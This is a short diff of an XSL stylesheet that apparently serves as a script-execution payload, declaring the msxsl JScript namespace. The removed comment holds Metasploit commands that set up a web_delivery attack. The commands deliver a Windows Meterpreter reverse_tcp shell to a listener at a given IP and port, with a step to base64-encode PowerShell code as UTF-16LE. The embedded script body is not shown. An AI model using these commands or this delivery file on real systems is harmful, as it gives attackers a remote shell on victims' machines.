@@ -2,21 +2,7 @@
       xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
       xmlns:msxsl="urn:schemas-microsoft-com:xslt"
       xmlns:user="http://mycompany.com/mynamespace">
-<!--
-#msf
-use exploit/multi/script/web_delivery
-set target 2
-set payload windows/meterpreter/reverse_tcp
-set lhost 192.168.100.101
-set lport 8889
-set uripath xslt
-exploit
 
-#base64
-
-pscode |iconv --to-code UTF-16LE |base64
-
--->
  <msxsl:script language="JScript" implements-prefix="user">
 <![CDATA[
   
